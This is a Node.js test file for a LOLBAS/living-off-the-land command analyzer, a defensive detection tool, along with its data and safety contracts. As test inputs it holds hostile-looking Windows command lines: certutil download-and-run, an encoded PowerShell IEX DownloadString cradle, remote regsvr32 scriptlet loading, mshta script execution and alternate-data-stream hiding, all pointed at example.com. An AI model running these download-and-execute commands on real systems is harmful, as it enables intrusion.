/* LotL / LOLBAS Command Analyzer engine and data tests. Pure Node.js, offline. Run: node tests/lotl-analyzer-engine.test.cjs */
'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const DIR = path.join(__dirname, '../wp-content/themes/cyberdat/assets/js/lotl-analyzer');
const engine = require(path.join(DIR, 'engine.js'));
const data = require(path.join(DIR, 'lolbas-data.js'));
const { parseYaml } = require(path.join(__dirname, '../deploy/tools-lotl-analyzer/update-lolbas-data.cjs'));
const { psenc } = require('./lotl-analyzer-corpus.test.cjs');

let passed = 0;
function check(label, fn) {
	try { fn(); } catch (e) { console.error('FAIL: ' + label); throw e; }
	passed++;
	console.log('PASS: ' + label);
}
const one = cmd => engine.analyze(cmd).commands[0];
const timed = fn => { const t = process.hrtime.bigint(); const r = fn(); return [r, Number(process.hrtime.bigint() - t) / 1e6]; };

// ---------------------------------------------------------------- data snapshot
check('data snapshot: LOLBAS source, pinned commit and date, GPL-3.0, and the snapshot record agrees', () => {
	assert.match(data.meta.commit, /^[0-9a-f]{40}$/);
	assert.match(data.meta.commitDate, /^\d{4}-\d{2}-\d{2}T/);
	assert.equal(data.meta.license, 'GPL-3.0');
	assert.ok(data.entries.length >= 200 && data.meta.commands >= 400);
	const snap = JSON.parse(fs.readFileSync(path.join(__dirname, '../deploy/tools-lotl-analyzer/lolbas-snapshot.json'), 'utf8'));
	assert.equal(snap.commit, data.meta.commit);
	assert.equal(snap.entries, data.entries.length);
	assert.equal(Object.keys(snap.files).length, data.entries.length);
});
check('data file carries the GPL-3.0 notice, the modification notice and the verbatim upstream license next to it', () => {
	const head = fs.readFileSync(path.join(DIR, 'lolbas-data.js'), 'utf8').slice(0, 2000);
	assert.match(head, /GNU General Public License v3\.0/);
	assert.match(head, /MODIFIED version/);
	assert.match(head, new RegExp('commit ' + data.meta.commit));
	assert.match(fs.readFileSync(path.join(DIR, 'LICENSE-LOLBAS.txt'), 'utf8'), /GNU GENERAL PUBLIC LICENSE\s+Version 3, 29 June 2007/);
});
check('data contains only Windows LOLBAS sections (no GTFOBins) and every command keeps LOLBAS category and MitreID', () => {
	const types = new Set(data.entries.map(e => e.type));
	for (const t of types) { assert.ok(['OSBinaries', 'OSLibraries', 'OSScripts', 'OtherMSBinaries', 'HonorableMentions'].includes(t), t); }
	for (const e of data.entries) {
		assert.match(e.page, /^https:\/\/lolbas-project\.github\.io\/lolbas\//);
		for (const c of e.commands) { assert.ok(c.category && typeof c.mitre === 'string'); }
		for (const [, u] of e.references) { assert.match(u, /^https:\/\/[^\s"'<>]+$/); }
	}
	assert.ok(!JSON.stringify(data).includes('gtfobins'));
});
check('YAML subset parser: block scalars, quoted scalars, nested sequences; and refuses flow collections', () => {
	const doc = parseYaml("---\nName: X.exe\nDescription: 'It''s here'\nCommands:\n  - Command: |\n      x.exe /a\n      x.exe /b\n    Description: \"C:\\\\Temp \\\\x\"\n    Tags:\n      - Execute: CMD\nFull_Path:\n  - Path: C:\\Windows\\x.exe\n", 't.yml');
	assert.equal(doc.Description, 'It\'s here');
	assert.equal(doc.Commands[0].Command, 'x.exe /a\nx.exe /b\n');
	assert.equal(doc.Commands[0].Description, 'C:\\Temp \\x');
	assert.deepEqual(doc.Commands[0].Tags, [{ Execute: 'CMD' }]);
	assert.equal(doc.Full_Path[0].Path, 'C:\\Windows\\x.exe');
	assert.throws(() => parseYaml('Name: {a: 1}\n', 'f.yml'), /flow collections/);
});

// ---------------------------------------------------------------- matching uses LOLBAS data only
check('a documented usage is reported with category, description and ATT&CK id copied from the LOLBAS entry', () => {
	const r = one('certutil.exe -urlcache -split -f http://example.com/a.txt C:\\Users\\Public\\a.txt');
	const b = r.binaries.find(x => x.name === 'Certutil.exe');
	const m = b.matches.find(x => x.category === 'Download');
	assert.ok(m && m.severity === 'high');
	const src = data.entries.find(e => e.name === 'Certutil.exe').commands.find(c => c.command === m.command);
	assert.equal(m.mitre, src.mitre);
	assert.equal(m.description, src.description);
	assert.equal(r.severity, 'high');
});
check('every reported ATT&CK id exists in the LOLBAS data for that binary; heuristics carry no ATT&CK id', () => {
	const corpus = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures/lotl-analyzer/corpus.json'), 'utf8'));
	for (const c of corpus.suspicious.concat(corpus.benign)) {
		const r = engine.analyze(c.cmd.replace(/\{\{psenc:([^}]*)\}\}/g, (m, s) => psenc(s))).commands[0];
		for (const b of r.binaries) {
			const mitres = new Set(data.entries.find(e => e.name === b.name).commands.map(x => x.mitre));
			for (const m of b.matches) { assert.ok(mitres.has(m.mitre), b.name + ' ' + m.mitre); }
		}
		for (const h of r.heuristics) { assert.equal(h.mitre, undefined); assert.match(h.id, /^LOT-H-\d{3}$/); }
	}
	for (const h of engine.HEURISTICS) { assert.ok(!/T1\d{3}/.test(h.explanation + h.title)); }
});
check('ordinary use of LOLBAS binaries is info or low, never medium+', () => {
	for (const c of ['certutil -hashfile C:\\a.exe SHA256', 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl', 'schtasks /query /fo LIST', 'wmic os get caption', 'msiexec /i C:\\Setup\\agent.msi /qn', 'bitsadmin /list /allusers']) {
		const r = one(c);
		assert.ok(['none', 'info', 'low'].includes(r.severity), c + ' → ' + r.severity);
	}
});
check('no match: verdict data says nothing matched; the page wording never claims safety', () => {
	const r = one('notepad.exe C:\\notes.txt');
	assert.equal(r.severity, 'none');
	const app = fs.readFileSync(path.join(DIR, 'app.js'), 'utf8');
	assert.ok(app.includes("none: ['No known patterns matched.', 'This does not mean the command is safe.']"));
	assert.ok(!/is safe\.|no threats? found|command is clean|benign\./i.test(app.replace(/does not mean (?:the|a) command is safe\./g, '')));
});

// ---------------------------------------------------------------- static decoding and deobfuscation
check('cmd.exe carets, quotes inside words, Unicode dashes and random case are removed before matching and reported', () => {
	for (const c of ['c^e^r^t^u^t^i^l -url^cache -f http://example.com/a a', 'cer""tutil -urlcache -f http://example.com/a a', 'CeRtUtIl.ExE –urlcache –f http://example.com/a a', 'cert"ut"il -urlcache -f http://example.com/a a']) {
		const r = one(c);
		assert.ok(r.binaries.some(b => b.name === 'Certutil.exe' && b.matches.some(m => m.category === 'Download')), c);
		assert.ok(r.heuristics.some(h => h.id === 'LOT-H-006'), c);
	}
});
check('PowerShell -EncodedCommand and its abbreviations are decoded from UTF-16LE Base64 and analyzed (never executed)', () => {
	const payload = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')";
	for (const flag of ['-EncodedCommand', '-enc', '-e', '-ec', '/enc', '-EnCoDeD']) {
		const r = one('powershell.exe -nop ' + flag + ' ' + psenc(payload));
		assert.equal(r.decoded[0].text, payload, flag);
		assert.ok(r.decoded[0].analysis.heuristics.some(h => h.id === 'LOT-H-004'));
		assert.equal(r.severity, 'high');
	}
	assert.ok(one('powershell -enc !!notbase64!!').heuristics.some(h => h.id === 'LOT-H-001' && h.severity === 'low'));
});
check('nested commands after cmd /c and powershell -Command are analyzed', () => {
	const r = one('cmd.exe /c "certutil -urlcache -f http://example.com/a.exe %TEMP%\\a.exe && %TEMP%\\a.exe"');
	assert.ok(r.binaries.some(b => b.name === 'Certutil.exe' && b.matches.some(m => m.category === 'Download')));
	const p = one('powershell -Command "regsvr32 /s /n /u /i:http://example.com/x.sct scrobj.dll"');
	assert.ok(p.binaries.some(b => b.name === 'Regsvr32.exe'));
});
check('CommandLine fields are extracted from JSON and key: value log records', () => {
	const j = one('{"Image":"C:\\\\Windows\\\\System32\\\\certutil.exe","CommandLine":"certutil -urlcache -f http://example.com/x x","User":"u"}');
	assert.ok(j.extractedFromLog && j.binaries.some(b => b.name === 'Certutil.exe'));
	const k = one('ProcessCreate CommandLine: mshta.exe vbscript:Close(Execute("x"))');
	assert.ok(k.extractedFromLog && k.binaries.some(b => b.name === 'Mshta.exe'));
});
check('binary started outside its LOLBAS locations is flagged; script protocols and ADS syntax are flagged', () => {
	assert.ok(one('C:\\Users\\Public\\certutil.exe -hashfile x').heuristics.some(h => h.id === 'LOT-H-007'));
	assert.ok(!one('C:\\Windows\\System32\\certutil.exe -hashfile x').heuristics.some(h => h.id === 'LOT-H-007'));
	assert.ok(one('mshta javascript:close()').heuristics.some(h => h.id === 'LOT-H-008'));
	assert.ok(one('type a.exe > C:\\temp\\log.txt:hidden.exe').heuristics.some(h => h.id === 'LOT-H-010'));
});
check('prose that merely mentions a binary name is not treated as an invocation', () => {
	assert.deepEqual(one('Please call the at desk and ask about the report').binaries, []);
	assert.deepEqual(one('the certutil documentation explains hashing').binaries, []);
});

// ---------------------------------------------------------------- safety and contracts
check('static contract: user text is written with textContent only; no eval, HTML sinks or dynamic code', () => {
	for (const f of ['app.js', 'engine.js', 'worker.js']) {
		const src = fs.readFileSync(path.join(DIR, f), 'utf8');
		assert.ok(!/\.innerHTML|\.outerHTML|insertAdjacentHTML|document\.write|\beval\s*\(|new Function|setTimeout\(\s*['"`]|createContextualFragment|DOMParser/.test(src), f);
	}
});
check('static contract: no network, storage or GitHub access in the browser code (the worker only disables network APIs)', () => {
	const src = fs.readFileSync(path.join(DIR, 'app.js'), 'utf8') + fs.readFileSync(path.join(DIR, 'engine.js'), 'utf8');
	assert.ok(!/\bfetch\s*\(|XMLHttpRequest|WebSocket|EventSource|sendBeacon|localStorage|sessionStorage|indexedDB|document\.cookie|history\.(?:push|replace)State|\bimport\s*\(|raw\.githubusercontent|api\.github\.com/.test(src));
	const worker = fs.readFileSync(path.join(DIR, 'worker.js'), 'utf8');
	assert.ok(!/\bfetch\s*\(|new XMLHttpRequest|github/i.test(worker));
	assert.match(worker, /importScripts\('lolbas-data\.js'/);
	assert.match(fs.readFileSync(path.join(DIR, 'app.js'), 'utf8'), /function dataLink\(url, text\) \{\n\t\tif \(!\/\^https:/);
});
check('the page examples use example.com only and no working payloads', () => {
	const app = fs.readFileSync(path.join(DIR, 'app.js'), 'utf8');
	const sample = app.slice(app.indexOf('const SAMPLE'), app.indexOf("].join('\\n')"));
	for (const u of sample.match(/https?:\/\/[^/\s"'\\)]+/g) || []) { assert.match(u, /\/\/example\.com$/); }
	const enc = sample.match(/-enc ([A-Za-z0-9+/=]+)/)[1];
	assert.match(Buffer.from(enc, 'base64').toString('utf16le'), /example\.com/);
});
check('input above 5 MB is refused with TOO_LARGE', () => {
	assert.throws(() => engine.analyze('a'.repeat(engine.MAX_INPUT_CHARS + 1)), e => e.code === 'TOO_LARGE');
});
const adversarial = {
	'long single token': 'a'.repeat(32000),
	'many carets': 'c^'.repeat(16000),
	'many quotes': '"a'.repeat(16000),
	'separators': '& '.repeat(16000),
	'nested cmd /c': ('cmd /c "').repeat(3000),
	'enc without value': 'powershell ' + '-enc '.repeat(6000),
	'Base64 blob': 'powershell -enc ' + 'QUFB'.repeat(8000),
	'unclosed JSON field': '{"CommandLine":"' + '\\"'.repeat(15000),
	'ADS-like': 'a.b:c '.repeat(5000),
	'URLs': 'certutil ' + 'http://example.com/a '.repeat(1500)
};
check(`ReDoS: ${Object.keys(adversarial).length} adversarial 32 KB lines each finish in under 1 s`, () => {
	for (const [name, line] of Object.entries(adversarial)) {
		const [, ms] = timed(() => engine.analyze(line));
		console.log(`      ${name.padEnd(22)} ${Math.round(ms)} ms`);
		assert.ok(ms < 1000, name + ' ' + ms);
	}
});
check('5 MB of mixed command lines: completes, progress reaches the end', () => {
	const corpus = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures/lotl-analyzer/corpus.json'), 'utf8'));
	const lines = corpus.suspicious.concat(corpus.benign).map(c => c.cmd.replace(/\{\{psenc:([^}]*)\}\}/g, (m, s) => psenc(s))).join('\n') + '\n';
	let text = '';
	while (text.length + lines.length < engine.MAX_INPUT_CHARS) { text += lines; }
	let last = -1;
	let total = 0;
	const [r, ms] = timed(() => engine.analyze(text, {}, { onProgress(d, t) { assert.ok(d >= last); last = d; total = t; } }));
	console.log(`      ${(text.length / 1048576).toFixed(1)} MB, ${r.counts.commands} commands in ${(ms / 1000).toFixed(1)} s (${r.counts.skipped} over the 20,000 command limit skipped)`);
	assert.equal(last, total);
	assert.ok(ms < 60000);
});

console.log(`\n${passed} engine checks passed.`);
